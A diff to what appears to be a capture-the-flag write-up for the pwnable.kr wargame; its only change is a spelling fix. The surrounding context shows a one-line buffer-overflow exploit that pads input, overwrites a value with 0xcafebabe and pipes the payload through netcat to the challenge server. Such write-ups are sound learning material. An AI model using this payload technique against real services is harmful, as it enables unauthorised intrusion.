@@ -161,7 +161,7 @@ Here's how:
 (python -c "import base64; print 'a'*52+'\xbe\xba\xfe\xca'" ; cat -) | nc pwnable.kr 9000
 ```
 
-How this works: you pipe everything within the parantheses over the socket to the target. The first thing you send over is your python payload, and all subsequent things are determined by stdin (via `cat -`).
+How this works: you pipe everything within the parentheses over the socket to the target. The first thing you send over is your python payload, and all subsequent things are determined by stdin (via `cat -`).
 
 ## Binary Service
 
